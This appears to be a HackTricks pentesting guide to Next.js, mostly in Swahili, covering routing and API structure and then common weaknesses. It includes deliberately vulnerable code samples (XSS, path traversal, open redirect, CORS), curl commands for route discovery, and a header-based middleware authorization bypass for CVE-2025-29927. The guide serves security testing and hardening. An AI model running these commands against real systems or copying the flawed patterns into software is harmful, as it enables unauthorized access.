# NextJS

{{#include ../../banners/hacktricks-training.md}}

## Muundo wa Jumla wa Programu ya Next.js

### Muundo wa Faili wa Kawaida

Mradi wa kawaida wa Next.js hufuata muundo maalum wa faili na saraka unaorahisisha vipengele vyake kama routing, API endpoints, na usimamizi wa mali za static. Hapa kuna mpangilio wa kawaida:
```lua
my-nextjs-app/
├── node_modules/
├── public/
│   ├── images/
│   │   └── logo.png
│   └── favicon.ico
├── app/
│   ├── api/
│   │   └── hello/
│   │       └── route.ts
│   ├── layout.tsx
│   ├── page.tsx
│   ├── about/
│   │   └── page.tsx
│   ├── dashboard/
│   │   ├── layout.tsx
│   │   └── page.tsx
│   ├── components/
│   │   ├── Header.tsx
│   │   └── Footer.tsx
│   ├── styles/
│   │   ├── globals.css
│   │   └── Home.module.css
│   └── utils/
│       └── api.ts
├── .env.local
├── next.config.js
├── tsconfig.json
├── package.json
├── README.md
└── yarn.lock / package-lock.json

```
### Saraka za Msingi na Faili

- **public/:** Inahifadhi assets za static kama picha, fonti, na faili nyingine. Faili hapa zinapatikana kwenye path ya mzizi (`/`).
- **app/:** Saraka kuu kwa pages, layouts, components, na API routes za aplikesheni yako. Inatumia kanuni ya **App Router**, ikiruhusu vipengele vya routing vilivyoendelea na ugawaji kati ya components za server na client.
- **app/layout.tsx:** Inabainisha layout ya mzizi ya aplikesheni yako, ikizunguka kurasa zote na kutoa vipengele vya UI vinavyolingana kama headers, footers, na navigation bars.
- **app/page.tsx:** Hudumu kama entry point kwa root route `/`, iki-render ukurasa wa nyumbani.
- **app/[route]/page.tsx:** Inashughulikia routes za static na dynamic. Kila folda ndani ya `app/` inawakilisha sehemu ya route, na `page.tsx` ndani ya zile folda inalingana na component ya route.
- **app/api/:** Ina API routes, ikikuruhusu kuunda serverless functions zinazo-handle HTTP requests. Routes hizi zinachukua nafasi ya saraka ya jadi `pages/api`.
- **app/components/:** Inahifadhi React components zinazoweza kutumika tena kwenye pages na layouts mbalimbali.
- **app/styles/:** Ina faili za global CSS na CSS Modules kwa styling inayolengwa kwa component.
- **app/utils/:** Inajumuisha utility functions, helper modules, na logic nyingine zisizo za UI ambazo zinaweza kushirikiwa ndani ya aplikesheni.
- **.env.local:** Inahifadhi environment variables maalum kwa mazingira ya local development. Variables hizi **hazijatumwa** kwenye version control.
- **next.config.js:** Inabinafsisha tabia za Next.js, ikiwa ni pamoja na webpack configurations, environment variables, na settings za usalama.
- **tsconfig.json:** Inapanga TypeScript settings kwa mradi, ikiwasha type checking na vipengele vingine vya TypeScript.
- **package.json:** Inasimamia dependencies za mradi, scripts, na metadata.
- **README.md:** Inatoa dokumentasi na taarifa kuhusu mradi, ikijumuisha maelekezo ya setup, miongozo ya matumizi, na maelezo mengine muhimu.
- **yarn.lock / package-lock.json:** Hufunga dependencies za mradi kwa toleo maalum, kuhakikisha usakinishaji unaendelea kwa mtiririko uleule katika mazingira tofauti.

## Client-Side in Next.js

### File-Based Routing katika saraka ya `app`

The `app` directory is the cornerstone of routing in the latest Next.js versions. It leverages the filesystem to define routes, making route management intuitive and scalable.

<details>

<summary>Kushughulikia Root Path /</summary>

**Muundo wa Faili:**
```arduino
my-nextjs-app/
├── app/
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Faili Muhimu:**

- **`app/page.tsx`**: Inashughulikia maombi kwa njia ya mzizi `/`.
- **`app/layout.tsx`**: Inabainisha mpangilio wa programu, ikifunika kurasa zote.

**Utekelezaji:**
```tsx
tsxCopy code// app/page.tsx

export default function HomePage() {
return (
<div>
<h1>Welcome to the Home Page!</h1>
<p>This is the root route.</p>
</div>
);
}
```
**Maelezo:**

- **Ufafanuzi wa Route:** Faili `page.tsx` iliyoko moja kwa moja chini ya saraka `app` inalingana na route `/`.
- **Uonyeshaji:** Komponenti hii ina-render maudhui ya ukurasa wa nyumbani.
- **Layout Integration:** Komponenti `HomePage` imefungwa na `layout.tsx`, ambayo inaweza kujumuisha headers, footers, na vipengele vingine vya kawaida.

</details>

<details>

<summary>Kushughulikia Paths za Stati Nyingine</summary>

**Mfano: `/about` Route**

**Muundo wa Faili:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── about/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Utekelezaji:**
```tsx
// app/about/page.tsx

export default function AboutPage() {
return (
<div>
<h1>About Us</h1>
<p>Learn more about our mission and values.</p>
</div>
)
}
```
**Maelezo:**

- **Ufafanuzi wa Njia:** Faili `page.tsx` ndani ya folda `about` inalingana na njia `/about`.
- **Uwasilishaji:** Komponenti hii inaonyesha maudhui ya ukurasa wa about.

</details>

<details>

<summary>Njia Dinamiki</summary>

Njia dinamiki zinaruhusu kushughulikia njia zenye sehemu zinazobadilika, zikiruhusu programu kuonyesha maudhui kulingana na vigezo kama IDs, slugs, n.k.

**Mfano: Njia `/posts/[id]`**

**Muundo wa Faili:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── posts/
│   │   └── [id]/
│   │       └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Utekelezaji:**
```tsx
tsxCopy code// app/posts/[id]/page.tsx

import { useRouter } from 'next/navigation';

interface PostProps {
params: { id: string };
}

export default function PostPage({ params }: PostProps) {
const { id } = params;
// Fetch post data based on 'id'

return (
<div>
<h1>Post #{id}</h1>
<p>This is the content of post {id}.</p>
</div>
);
}
```
**Maelezo:**

- **Dynamic Segment:** `[id]` inaonyesha sehemu inayobadilika katika route, ikikamata parameter `id` kutoka kwa URL.
- **Accessing Parameters:** Kitu `params` kina parameta zinazobadilika, zinazopatikana ndani ya komponenti.
- **Route Matching:** Njia yoyote inayolingana na `/posts/*`, kama `/posts/1`, `/posts/abc`, n.k., itashughulikiwa na komponenti hii.

</details>

<details>

<summary>Njia Zilizowekwa Ndani</summary>

Next.js inaunga mkono routing za ndani, ikiruhusu miundo ya njia za ngazi zinazolingana na muundo wa saraka.

**Mfano: Njia `/dashboard/settings/profile`**

**Muundo wa Faili:**
```arduino
arduinoCopy codemy-nextjs-app/
├── app/
│   ├── dashboard/
│   │   ├── settings/
│   │   │   └── profile/
│   │   │       └── page.tsx
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Utekelezaji:**
```tsx
tsxCopy code// app/dashboard/settings/profile/page.tsx

export default function ProfileSettingsPage() {
return (
<div>
<h1>Profile Settings</h1>
<p>Manage your profile information here.</p>
</div>
);
}
```
**Maelezo:**

- **Uwekaji ndani kwa kina:** Faili `page.tsx` ndani ya `dashboard/settings/profile/` inalingana na njia `/dashboard/settings/profile`.
- **Uakisi wa hierarki:** Muundo wa saraka unaakisi njia ya URL, ikiboresha matengenezo na uwazi.

</details>

<details>

<summary>Njia za kukamata zote</summary>

Njia za kukamata zote zinashughulikia sehemu nyingi zilizofungamanishwa au njia zisizojulikana, zikitoa unyumbufu katika kushughulikia njia.

**Mfano: Njia `/*`**

**Muundo wa Faili:**
```arduino
my-nextjs-app/
├── app/
│   ├── [...slug]/
│   │   └── page.tsx
│   ├── layout.tsx
│   └── page.tsx
├── public/
├── next.config.js
└── ...
```
**Utekelezaji:**
```tsx
// app/[...slug]/page.tsx

interface CatchAllProps {
params: { slug: string[] }
}

export default function CatchAllPage({ params }: CatchAllProps) {
const { slug } = params
const fullPath = `/${slug.join("/")}`

return (
<div>
<h1>Catch-All Route</h1>
<p>You have navigated to: {fullPath}</p>
</div>
)
}
```
**Maelezo:**

- **Sehemu ya Catch-All:** `[...slug]` inakamata sehemu zote za njia zilizobaki kama array.
- **Matumizi:** Inafaa kwa kushughulikia matukio ya routing ya dinamiki kama njia zinazotengenezwa na watumiaji, makundi yaliyowekwa ndani, n.k.
- **Ulinganishaji wa Route:** Njia kama `/anything/here`, `/foo/bar/baz`, n.k., zinashughulikiwa na component hii.

</details>

### Udhaifu za Upande wa Mteja (Client-Side)

Wakati Next.js inatoa msingi salama, mbinu mbaya za kuandika msimbo zinaweza kuleta udhaifu. Udhaifu muhimu upande wa mteja ni pamoja na:

<details>

<summary>Cross-Site Scripting (XSS)</summary>

XSS attacks hutokea wakati skripti hatari zinachomwa kwenye tovuti zinazoaminika. Wavamizi wanaweza kuendesha skripti kwenye vivinjari vya watumiaji, kuiba data au kutekeleza vitendo kwa niaba ya mtumiaji.

**Mfano wa Msimbo Yenye Udhaifu:**
```jsx
// Dangerous: Injecting user input directly into HTML
function Comment({ userInput }) {
return <div dangerouslySetInnerHTML={{ __html: userInput }} />
}
```
**Kwa Nini Ni Hatari:** Matumizi ya `dangerouslySetInnerHTML` na input zisizotegemewa huwapa attackers uwezo wa kuingiza script zenye madhara.

</details>

<details>

<summary>Client-Side Template Injection</summary>

Hutokea wakati input za watumiaji hazishughulikiwa ipasavyo katika templates, na hivyo kuwawezesha attackers kuingiza na kuendesha templates au expressions.

**Mfano wa Code Yenye Udhaifu:**
```jsx
import React from "react"
import ejs from "ejs"

function RenderTemplate({ template, data }) {
const html = ejs.render(template, data)
return <div dangerouslySetInnerHTML={{ __html: html }} />
}
```
**Kwa Nini Ni Dhaifu:** Ikiwa `template` au `data` ina maudhui yenye madhara, inaweza kusababisha utekelezaji wa code isiyokusudiwa.

</details>

<details>

<summary>Client Path Traversal</summary>

Ni udhaifu unaowawezesha washambuliaji kuibadilisha client-side paths kufanya vitendo visivyokusudiwa, kama Cross-Site Request Forgery (CSRF). Tofauti na server-side path traversal, ambayo inalenga filesystem ya server, CSPT inalenga kutumia mekanisma za upande wa mteja kupeleka ombi halali la API kwa endpoints hatarishi.

**Mfano wa Code Iliyo na Udhaifu:** 

Programu ya Next.js inawawezesha watumiaji kupakia na kupakua faili. Kipengele cha kupakua kimewekwa upande wa mteja, ambapo watumiaji wanaweza kubainisha njia ya faili ya kupakua.
```jsx
// pages/download.js
import { useState } from "react"

export default function DownloadPage() {
const [filePath, setFilePath] = useState("")

const handleDownload = () => {
fetch(`/api/files/${filePath}`)
.then((response) => response.blob())
.then((blob) => {
const url = window.URL.createObjectURL(blob)
const a = document.createElement("a")
a.href = url
a.download = filePath
a.click()
})
}

return (
<div>
<h1>Download File</h1>
<input
type="text"
value={filePath}
onChange={(e) => setFilePath(e.target.value)}
placeholder="Enter file path"
/>
<button onClick={handleDownload}>Download</button>
</div>
)
}
```
#### Attack Scenario

1. **Attacker's Objective**: Perform a CSRF attack to delete a critical file (e.g., `admin/config.json`) by manipulating the `filePath`.
2. **Exploiting CSPT**:
- **Malicious Input**: The attacker crafts a URL with a manipulated `filePath` such as `../deleteFile/config.json`.
- **Resulting API Call**: The client-side code makes a request to `/api/files/../deleteFile/config.json`.
- **Server's Handling**: If the server does not validate the `filePath`, it processes the request, potentially deleting or exposing sensitive files.
3. **Executing CSRF**:
- **Crafted Link**: The attacker sends the victim a link or embeds a malicious script that triggers the download request with the manipulated `filePath`.
- **Outcome**: The victim unknowingly executes the action, leading to unauthorized file access or deletion.

#### Why It's Vulnerable

- **Lack of Input Validation**: The client-side allows arbitrary `filePath` inputs, enabling path traversal.
- **Trusting Client Inputs**: The server-side API trusts and processes the `filePath` without sanitization.
- **Potential API Actions**: If the API endpoint performs state-changing actions (e.g., delete, modify files), it can be exploited via CSPT.

</details>

### Recon: static export route discovery via _buildManifest

When `nextExport`/`autoExport` are true (static export), Next.js exposes the `buildId` in the HTML and serves a build manifest at `/_next/static/<buildId>/_buildManifest.js`. The `sortedPages` array and route→chunk mapping there enumerate every prerendered page without brute force.

- Grab the buildId from the root response (often printed at the bottom) or from `<script>` tags loading `/_next/static/<buildId>/...`.
- Fetch the manifest and extract routes:
```bash
build=$(curl -s http://target/ | grep -oE '"buildId":"[^"]+"' | cut -d: -f2 | tr -d '"')
curl -s "http://target/_next/static/${build}/_buildManifest.js" | grep -oE '"(/[a-zA-Z0-9_\[\]\-/]+)"' | tr -d '"'
```
- Tumia paths zilizogunduliwa (kwa mfano `/docs`, `/docs/content/examples`, `/signin`) kuendesha majaribio ya uthibitishaji na ugunduzi wa endpoints.

## Upande wa Server katika Next.js

### Uwasilishaji upande wa seva (SSR)

Kurasa zinatengenezwa kwenye seva kwa kila ombi, kuhakikisha mtumiaji anapokea HTML iliyokomaa kabisa. Katika kesi hii unapaswa kuunda seva yako maalum ili kushughulikia maombi.

**Matumizi:**

- Maudhui yanayobadilika mara kwa mara.
- Uboreshaji wa SEO, kwani mashine za utaftaji zinaweza kufuatilia ukurasa uliotengenezwa kikamilifu.

**Utekelezaji:**
```jsx
// pages/index.js
export async function getServerSideProps(context) {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data } }
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Uundaji wa tovuti statiki (SSG)

Kurasa hutayarishwa kabla ya wakati wa kujenga (build), hivyo kusababisha upakiaji wa haraka na kupunguza mzigo kwenye seva.

**Matumizi:**

- Maudhui yasiyotabadilika mara kwa mara.
- Blogi, nyaraka, kurasa za masoko.

**Utekelezaji:**
```jsx
// pages/index.js
export async function getStaticProps() {
const res = await fetch("https://api.example.com/data")
const data = await res.json()
return { props: { data }, revalidate: 60 } // Revalidate every 60 seconds
}

function HomePage({ data }) {
return <div>{data.title}</div>
}

export default HomePage
```
### Kazi zisizo na seva (API Routes)

Next.js inaruhusu uundaji wa endpoints za API kama kazi zisizo na seva. Kazi hizi zinatekelezwa kwa mahitaji bila hitaji la seva iliyotengwa.

**Matumizi:**

- Kushughulikia uwasilishaji wa fomu.
- Kuingiliana na hifadhidata.
- Kusindika data au kuunganisha na APIs za pande za tatu.

**Utekelezaji:**

Kwa kuanzishwa kwa saraka ya `app` katika Next.js 13, routing na kushughulikia API yamekuwa yenye kubadilika zaidi na yenye nguvu. Mbinu hii ya kisasa inaendana kwa karibu na mfumo wa routing uliotegemea faili, lakini inaleta uwezo ulioboreshwa, ikijumuisha msaada kwa komponenti za server na client.

#### Mshughulikiaji wa Ruta Msingi

**Muundo wa Faili:**
```go
my-nextjs-app/
├── app/
│   └── api/
│       └── hello/
│           └── route.js
├── package.json
└── ...
```
**Utekelezaji:**
```javascript
// app/api/hello/route.js

export async function POST(request) {
return new Response(JSON.stringify({ message: "Hello from App Router!" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

// Client-side fetch to access the API endpoint
fetch("/api/submit", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ name: "John Doe" }),
})
.then((res) => res.json())
.then((data) => console.log(data))
```
**Maelezo:**

- **Mahali:** API routes ziko ndani ya saraka `app/api/`.
- **Jina la Faili:** Kila endpoint ya API iko kwenye saraka yake yenye faili `route.js` au `route.ts`.
- **Funsi Zilizotolewa:** Badala ya export moja ya default, fonksi maalum za HTTP method (mf., `GET`, `POST`) zinatolewa.
- **Usindikaji wa Majibu:** Tumia constructor ya `Response` kurudisha majibu, ikiruhusu udhibiti zaidi wa headers na status codes.

#### Jinsi ya kushughulikia njia na methods nyingine:

<details>

<summary>Kushughulikia HTTP Methods Maalum</summary>

Next.js 13+ inakuwezesha kufafanua handlers kwa HTTP methods maalum ndani ya faili ile ile ya `route.js` au `route.ts`, ikileta msimbo ulio wazi na uliopangwa vizuri zaidi.

**Mfano:**
```javascript
// app/api/users/[id]/route.js

export async function GET(request, { params }) {
const { id } = params
// Fetch user data based on 'id'
return new Response(JSON.stringify({ userId: id, name: "Jane Doe" }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function PUT(request, { params }) {
const { id } = params
// Update user data based on 'id'
return new Response(JSON.stringify({ message: `User ${id} updated.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}

export async function DELETE(request, { params }) {
const { id } = params
// Delete user based on 'id'
return new Response(JSON.stringify({ message: `User ${id} deleted.` }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Maelezo:**

- **Multiple Exports:** Kila method ya HTTP (`GET`, `PUT`, `DELETE`) ina function yake iliyotumwa.
- **Parameters:** Hoja ya pili inatoa ufikaji kwa vigezo vya route kupitia `params`.
- **Enhanced Responses:** Udhibiti zaidi juu ya response objects, ukiruhusu usimamizi sahihi wa headers na status codes.

</details>

<details>

<summary>Catch-All na Nested Routes</summary>

Next.js 13+ inaunga mkono vipengele vya routing vya hali ya juu kama catch-all routes na nested API routes, ikiruhusu muundo wa API kuwa wa nguvu zaidi na unaoweza kupanuka.

**Mfano wa Catch-All Route:**
```javascript
// app/api/[...slug]/route.js

export async function GET(request, { params }) {
const { slug } = params
// Handle dynamic nested routes
return new Response(JSON.stringify({ slug }), {
status: 200,
headers: { "Content-Type": "application/json" },
})
}
```
**Maelezo:**

- **Syntax:** `[...]` inaonyesha sehemu ya catch-all (inayokamata njia zote zilizo ndani).
- **Matumizi:** Inafaa kwa APIs zinazohitaji kushughulikia kina tofauti za njia au segments zinazobadilika.

**Mfano wa Nested Routes:**
```javascript
// app/api/posts/[postId]/comments/[commentId]/route.js

export async function GET(request, { params }) {
const { postId, commentId } = params
// Fetch specific comment for a post
return new Response(
JSON.stringify({ postId, commentId, comment: "Great post!" }),
{
status: 200,
headers: { "Content-Type": "application/json" },
}
)
}
```
**Maelezo:**

- **Kuingizwa kwa kina:** Inaruhusu miundo ya API iliyopangwa kwa ngazi, ikionyesha uhusiano wa rasilimali.
- **Ufikiaji wa vigezo:** Pata kwa urahisi vigezo vingi vya njia kupitia kitu cha `params`.

</details>

<details>

<summary>Kushughulikia API routes katika Next.js 12 na Zilizotangulia</summary>

## API Routes katika the `pages` Directory (Next.js 12 na Zilizotangulia)

Kabla Next.js 13 ilipotambulisha the `app` directory na kuboresha uwezo wa routing, API routes zilikuwa zimetamuliwa hasa ndani ya the `pages` directory. Mbinu hii bado inatumiwa sana na inaungwa mkono katika Next.js 12 na matoleo ya awali.

#### Route ya API ya Msingi

**Muundo wa Faili:**
```go
goCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── hello.js
├── package.json
└── ...
```
**Utekelezaji:**
```javascript
javascriptCopy code// pages/api/hello.js

export default function handler(req, res) {
res.status(200).json({ message: 'Hello, World!' });
}
```
**Maelezo:**

- **Mahali:** API routes ziko chini ya saraka `pages/api/`.
- **Utoaji:** Tumia `export default` ili kutambulisha handler function.
- **Saini ya function:** handler anapokea vitu vya `req` (ombi la HTTP) na `res` (jibu la HTTP).
- **Routing:** Jina la faili (`hello.js`) linahusishwa na endpoint `/api/hello`.

#### Routes za API zinazobadilika

**Muundo wa Faili:**
```bash
bashCopy codemy-nextjs-app/
├── pages/
│   └── api/
│       └── users/
│           └── [id].js
├── package.json
└── ...
```
**Utekelezaji:**
```javascript
javascriptCopy code// pages/api/users/[id].js

export default function handler(req, res) {
const {
query: { id },
method,
} = req;

switch (method) {
case 'GET':
// Fetch user data based on 'id'
res.status(200).json({ userId: id, name: 'John Doe' });
break;
case 'PUT':
// Update user data based on 'id'
res.status(200).json({ message: `User ${id} updated.` });
break;
case 'DELETE':
// Delete user based on 'id'
res.status(200).json({ message: `User ${id} deleted.` });
break;
default:
res.setHeader('Allow', ['GET', 'PUT', 'DELETE']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Maelezo:**

- **Dynamic Segments:** Mabano ya mraba (`[id].js`) yanaashiria sehemu za ruta zinazobadilika.
- **Accessing Parameters:** Tumia `req.query.id` kupata parametro inayobadilika.
- **Handling Methods:** Tumia mantiki ya masharti kushughulikia method tofauti za HTTP (`GET`, `PUT`, `DELETE`, n.k.).

#### Kushughulikia Method Tofauti za HTTP

Ingawa mfano wa msingi wa ruta ya API unashughulikia method zote za HTTP ndani ya function moja, unaweza kupanga code yako kushughulikia kila method kwa uwazi zaidi na kwa urahisi wa matengenezo.

**Mfano:**
```javascript
javascriptCopy code// pages/api/posts.js

export default async function handler(req, res) {
const { method } = req;

switch (method) {
case 'GET':
// Handle GET request
res.status(200).json({ message: 'Fetching posts.' });
break;
case 'POST':
// Handle POST request
res.status(201).json({ message: 'Post created.' });
break;
default:
res.setHeader('Allow', ['GET', 'POST']);
res.status(405).end(`Method ${method} Not Allowed`);
}
}
```
**Mbinu Bora:**

- **Kutenganisha Majukumu:** Tenganisha kwa uwazi mantiki kwa HTTP methods tofauti.
- **Ulinganifu wa Majibu:** Hakikisha miundo ya majibu ni thabiti ili kurahisisha uendeshaji upande wa mteja.
- **Utunzaji wa Makosa:** Shughulikia kwa utaratibu HTTP methods zisizoungwa mkono na makosa yasiyotarajiwa.

</details>

### Usanidi wa CORS

Dhibiti vyanzo vinavyoweza kufikia API routes zako, kupunguza udhaifu wa Cross-Origin Resource Sharing (CORS).

**Mfano wa Usanidi Mbaya:**
```javascript
// app/api/data/route.js

export async function GET(request) {
return new Response(JSON.stringify({ data: "Public Data" }), {
status: 200,
headers: {
"Access-Control-Allow-Origin": "*", // Allows any origin
"Access-Control-Allow-Methods": "GET, POST, PUT, DELETE",
},
})
}
```
Kumbuka kwamba **CORS pia inaweza kusanidiwa katika routes zote za API** ndani ya faili **`middleware.ts`**:
```javascript
// app/middleware.ts

import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(request: NextRequest) {
const allowedOrigins = [
"https://yourdomain.com",
"https://sub.yourdomain.com",
]
const origin = request.headers.get("Origin")

const response = NextResponse.next()

if (allowedOrigins.includes(origin || "")) {
response.headers.set("Access-Control-Allow-Origin", origin || "")
response.headers.set(
"Access-Control-Allow-Methods",
"GET, POST, PUT, DELETE, OPTIONS"
)
response.headers.set(
"Access-Control-Allow-Headers",
"Content-Type, Authorization"
)
// If credentials are needed:
// response.headers.set('Access-Control-Allow-Credentials', 'true');
}

// Handle preflight requests
if (request.method === "OPTIONS") {
return new Response(null, {
status: 204,
headers: response.headers,
})
}

return response
}

export const config = {
matcher: "/api/:path*", // Apply to all API routes
}
```
**Tatizo:**

- **`Access-Control-Allow-Origin: '*'`:** Inaruhusu tovuti yoyote kufikia API, na hivyo inaweza kuruhusu tovuti zenye nia mbaya kuingiliana na API yako bila vizuizi.
- **Wide Method Allowance:** Kuruhusu methods zote kunaweza kuwezesha washambuliaji kufanya vitendo visivyotakiwa.

**Jinsi washambuliaji wanavyovitumia:**

Washambuliaji wanaweza kutengeneza tovuti zenye madhumuni mabaya ambazo zinatuma maombi kwa API yako, na kwa hivyo kuzitumia vibaya zinazofanana na kupata data, kuibadilisha data, au kusababisha vitendo visivyotakiwa kwa niaba ya watumiaji waliothibitishwa.


{{#ref}}
../../pentesting-web/cors-bypass.md
{{#endref}}

### Kufichuliwa kwa code ya server kwenye upande wa client

Ni rahisi kutumia **code inayotumika kwenye server pia katika code inayofichuliwa na kutumika upande wa client**, njia bora ya kuhakikisha kwamba faili ya code haitafichuliwa upande wa client ni kutumia import hii mwanzoni mwa faili:
```js
import "server-only"
```
## Faili Muhimu na Majukumu Yao

### `middleware.ts` / `middleware.js`

**Mahali:** Mzizi wa mradi au ndani ya `src/`.

**Purpose:** Inatekeleza code katika server-side serverless function kabla request inasindika, ikiruhusu kazi kama authentication, redirects, au modifying responses.

**Mtiririko wa Utekelezaji:**

1. **Incoming Request:** middleware inakamata the request.
2. **Processing:** Inafanya operations based on the request (e.g., check authentication).
3. **Response Modification:** Inaweza kubadilisha the response au kupeana control kwa next handler.

**Mifano ya Matumizi:**

- Redirecting unauthenticated users.
- Adding custom headers.
- Logging requests.

**Mfano wa Configuration:**
```typescript
// middleware.ts
import { NextResponse } from "next/server"
import type { NextRequest } from "next/server"

export function middleware(req: NextRequest) {
const url = req.nextUrl.clone()
if (!req.cookies.has("token")) {
url.pathname = "/login"
return NextResponse.redirect(url)
}
return NextResponse.next()
}

export const config = {
matcher: ["/protected/:path*"],
}
```
### Middleware authorization bypass (CVE-2025-29927)

Ikiwa authorization imetekelezwa katika middleware, matoleo ya Next.js yaliyoathirika (<12.3.5 / 13.5.9 / 14.2.25 / 15.2.3) yanaweza ku-bypass kwa kuingiza header `x-middleware-subrequest`. The framework itapita middleware recursion na kurudisha ukurasa uliolindwa.

- Tabia ya msingi kawaida ni redirect 307 kwenda kwenye route ya login kama `/api/auth/signin`.
- Tuma thamani ndefu ya `x-middleware-subrequest` (rudia `middleware` ili ufikie `MAX_RECURSION_DEPTH`) ili kubadili jibu kuwa 200:
```bash
curl -i "http://target/docs" \
-H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```
- Kwa sababu kurasa za authenticated zinavuta subresources nyingi, ongeza header kwa kila request (e.g., Burp Match/Replace with an empty match string) ili kuzuia assets kutoka redirecting.

### `next.config.js`

**Location:** Mizizi ya mradi.

**Purpose:** Inasawazisha tabia ya Next.js, kuwezesha au kuzima vipengele, kubinafsisha webpack configurations, kuweka environment variables, na kusanidi vipengele kadhaa vya usalama.

**Key Security Configurations:**

<details>

<summary>Headers za Usalama</summary>

Security headers huimarisha usalama wa programu yako kwa kuelekeza vichunguzi vya wavuti jinsi ya kushughulikia maudhui. Husaidia kupunguza mashambulizi mbalimbali kama Cross-Site Scripting (XSS), Clickjacking, na MIME type sniffing:

- Content Security Policy (CSP)
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Referrer Policy

**Mifano:**
```javascript
// next.config.js

module.exports = {
async headers() {
return [
{
source: "/(.*)", // Apply to all routes
headers: [
{
key: "X-Frame-Options",
value: "DENY",
},
{
key: "Content-Security-Policy",
value:
"default-src *; script-src 'self' 'unsafe-inline' 'unsafe-eval';",
},
{
key: "X-Content-Type-Options",
value: "nosniff",
},
{
key: "Strict-Transport-Security",
value: "max-age=63072000; includeSubDomains; preload", // Enforces HTTPS
},
{
key: "Referrer-Policy",
value: "no-referrer", // Completely hides referrer
},
// Additional headers...
],
},
]
},
}
```
</details>

<details>

<summary>Mipangilio ya Uboreshaji wa Picha</summary>

Next.js huboresha picha kwa ajili ya utendaji, lakini mipangilio isiyofaa inaweza kusababisha udhaifu wa usalama, kama kuruhusu vyanzo visivyoaminika kuingiza yaliyomo yenye madhara.

**Mfano wa Usanidi Mbaya:**
```javascript
// next.config.js

module.exports = {
images: {
domains: ["*"], // Allows images from any domain
},
}
```
**Tatizo:**

- **`'*'`:** Inaruhusu picha kupakuliwa kutoka kwa vyanzo vyovyote vya nje, vikiwemo domain zisizoaminika au zenye nia mbaya. Wavamizi wanaweza kuhifadhi picha zenye payload hatarishi au maudhui yanayowadanganya watumiaji.
- Tatizo jingine linaweza kuwa kuruhusu domain **ambako mtu yeyote anaweza kupakia picha** (kama `raw.githubusercontent.com`)

**Jinsi wavamizi wanavyovitumia vibaya:**

Kwa kuingiza picha kutoka kwa vyanzo vyenye nia mbaya, wavamizi wanaweza kufanya mashambulizi ya phishing, kuonyesha taarifa za kuwakosea watumiaji, au kutumia udhaifu katika maktaba za kuonyesha picha.

</details>

<details>

<summary>Ufunuo wa Variables za Mazingira</summary>

Dhibiti habari nyeti kama API keys na database credentials kwa usalama bila kuziweka wazi kwa mteja.

#### a. Kufunua Variables Nyeti

**Mfano Mbaya wa Usanidi:**
```javascript
// next.config.js

module.exports = {
env: {
SECRET_API_KEY: process.env.SECRET_API_KEY, // Exposed to the client
NEXT_PUBLIC_API_URL: process.env.NEXT_PUBLIC_API_URL, // Correctly prefixed for client
},
}
```
**Tatizo:**

- **`SECRET_API_KEY`:** Bila prefiksi ya `NEXT_PUBLIC_`, Next.js haitoi vigezo kwa upande wa client. Hata hivyo, ikiwa kwa bahati mbaya itapewa prefiksi (mfano, `NEXT_PUBLIC_SECRET_API_KEY`), itakuwa inapatikana upande wa client.

**Jinsi washambuliaji wanavyovitumia:**

Iwapo vigezo nyeti vitawekwa wazi kwa client, washambuliaji wanaweza kuzipata kwa kuchambua msimbo wa upande wa client au maombi ya mtandao, na kupata ufikiaji usioidhinishwa kwa APIs, databases, au huduma nyingine.

</details>

<details>

<summary>Uelekeaji</summary>

Manage URL redirections and rewrites within your application, ensuring that users are directed appropriately without introducing open redirect vulnerabilities.

#### a. Open Redirect Vulnerability

**Mfano wa Usanidi Mbaya:**
```javascript
// next.config.js

module.exports = {
async redirects() {
return [
{
source: "/redirect",
destination: (req) => req.query.url, // Dynamically redirects based on query parameter
permanent: false,
},
]
},
}
```
**Tatizo:**

- **Dynamic Destination:** Inaruhusu watumiaji kubainisha URL yoyote, ikiruhusu open redirect attacks.
- **Trusting User Input:** Kupeleka kwa URL zilizotolewa na watumiaji bila uthibitisho kunaweza kusababisha phishing, malware distribution, au credential theft.

**Jinsi washambuliaji wanavyovitumia vibaya:**

Washambuliaji wanaweza kuunda URL zinazoweza kuonekana zimetoka kwenye domain yako lakini kupeleka watumiaji kwa tovuti hatarishi. Kwa mfano:
```bash
https://yourdomain.com/redirect?url=https://malicious-site.com
```
Watumiaji wanaoamini domain asilia wanaweza bila kujua kuvinjari kwenye tovuti zenye madhara.

</details>

<details>

<summary>Mipangilio ya Webpack</summary>

Badilisha mipangilio ya Webpack kwa programu yako ya Next.js, ambayo inaweza bila kukusudia kuleta udhaifu wa usalama ikiwa haitashughulikiwa kwa uangalifu.

#### a. Kufichua Moduli Nyeti

**Mfano wa Mipangilio Mbaya:**
```javascript
// next.config.js

module.exports = {
webpack: (config, { isServer }) => {
if (!isServer) {
config.resolve.alias["@sensitive"] = path.join(__dirname, "secret-folder")
}
return config
},
}
```
**Tatizo:**

- **Exposing Sensitive Paths:** Kuunda alias kwa directories nyeti na kuruhusu ufikiaji upande wa client kunaweza leak taarifa za siri.
- **Bundling Secrets:** Ikiwa mafaili nyeti yamebundled kwa client, yaliyomo yatakuwa yanapatikana kupitia source maps au kwa kuchunguza client-side code.

**How attackers abuse it:**

Attackers can access or reconstruct the application's directory structure, potentially finding and exploiting sensitive files or data.

</details>

